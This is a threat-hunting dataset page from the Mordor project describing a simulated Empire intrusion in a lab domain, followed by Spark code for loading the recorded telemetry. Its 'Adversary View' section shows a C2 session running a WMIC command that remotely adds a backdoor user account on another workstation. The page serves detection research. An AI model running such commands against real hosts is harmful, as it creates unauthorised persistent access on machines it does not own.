# WMIC Add User Backdoor

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-190518231333 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2019/05/18 |
| platform              | Windows |
| Tactic(s)             | ['[TA0002](https://attack.mitre.org/tactics/TA0002)', '[TA0008](https://attack.mitre.org/tactics/TA0008)'] |
| Technique(s)          | ['[T1047](https://attack.mitre.org/techniques/T1047)'] |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | [None] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user_backdoor.zip |
| References        | None |

## Dataset Description
This dataset represents adversaries using WMI to add a backdoor user on endpoints remotely

## Adversary View
```
(Empire: agents) > 
[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
[*] New agent 6Z78CY25 checked in
[+] Initial agent 6Z78CY25 from 172.18.39.5 now active (Slack)
[*] Sending agent (stage 2) to 6Z78CY25 at 172.18.39.5
agents

[*] Active agents:

Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
KFL6CMNZ ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         7584   5/0.0    2020-09-14 11:33:59  http            
YGBLW8EM ps 172.18.39.5     WORKSTATION5      *THESHIRE\wardog        powershell         8924   5/0.0    2020-09-14 11:40:53  http            
UBCKLYFA ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         5412   5/0.0    2020-09-14 11:57:16  http            

6Z78CY25 ps 172.18.39.5     WORKSTATION5      *THESHIRE\pgustavo      powershell         9564   5/0.0    2020-09-14 12:02:08  http            

(Empire: agents) > interact 6Z78CY25
(Empire: 6Z78CY25) > 
(Empire: 6Z78CY25) > shell wmic /node:WORKSTATION6 process call create "net user /add backdoor pa$$w0rd1"
[*] Tasked 6Z78CY25 to run TASK_SHELL
[*] Agent 6Z78CY25 tasked with task ID 1
(Empire: 6Z78CY25) > 
Executing (Win32_Process)->Create()

Method execution successful.

Out Parameters:
instance of __PARAMETERS
{
  ProcessId = 7768;
  ReturnValue = 0;
};

..Command execution completed.

(Empire: 6Z78CY25) >
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/empire_wmic_add_user_backdoor.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        